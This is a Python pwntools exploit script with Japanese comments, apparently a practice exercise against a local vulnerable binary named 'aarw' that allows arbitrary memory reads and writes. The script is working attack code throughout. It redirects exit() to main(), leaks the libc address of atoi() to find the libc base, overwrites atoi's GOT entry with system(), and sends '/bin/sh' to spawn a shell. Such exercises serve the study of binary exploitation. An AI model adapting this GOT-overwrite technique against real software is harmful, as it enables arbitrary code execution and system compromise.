#!/usr/bin/env python3

# ・概要：GOT書き換え
# ・実行：$ python3 exploit_aarw.py
# ・内容：aarw.cのaarw関数で任意のアドレスに任意のデータを書き込みできるため、atoi()をsystem()に書き換える

from pwn import *

bin_file = './aarw'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

binf = ELF(bin_file)
addr_got_atoi    = binf.got['atoi']                # GOTテーブル:atoi()のアドレス
addr_got_exit    = binf.got['exit']                # GOTテーブル:exit()のアドレス
addr_main        = binf.functions['main'].address  # main()のアドレス

libc = binf.libc
offset_libc_atoi = libc.functions['atoi'].address  # atoi()のアドレス

def attack(conn, **kwargs):
    aaw(conn, addr_got_exit, addr_main)                       # exit()をmain()に書き換え（./aarwが再起動すると、アドレスが変わる対策）

    addr_libc_atoi = aar(conn, addr_got_atoi)                 # atoi()のアドレスをリークする
    info('addr_libc_atoi    = 0x{:08x}'.format(addr_libc_atoi))
    libc.address = addr_libc_atoi - offset_libc_atoi          # libcのベースアドレスを求める
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.functions['system'].address    # system()のアドレスを求める
    info('addr_libc_system  = 0x{:08x}'.format(addr_libc_system))

    aaw(conn, addr_got_atoi, addr_libc_system)                # atoi()をsystem()に書き換える
    conn.sendlineafter('>> ', '/bin/sh\x00')

def aar(conn, addr):
    conn.sendlineafter('>> ', '1')                  # 端末に'>> 'と表示されたら、1を入力する
    conn.sendlineafter('read >> ', hex(addr))       # 端末に'read >> 'と表示されたら、hex(addr)を入力する
    conn.recvuntil(' : ')                           # aar()内のprintf("%p : %p\n", p, *p)より、' : 'が端末に表示されるまでを受信する
    return int(conn.recvuntil('\n', drop=True), 16) # aar()内のprintf("%p : %p\n", p, *p)より、' : '～'\n'を受信する

def aaw(conn, addr, val):
    conn.sendlineafter('>> ', '2')                  # 端末に'>> 'と表示されたら、2を入力する
    conn.sendlineafter('write >> ', hex(addr))      # 端末に'write >> 'と表示されたら、hex(addr)を入力する
    conn.sendlineafter('value >> ', hex(val))       # 端末に'value >> 'と表示されたら、hex(val)を入力する

def main():
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()
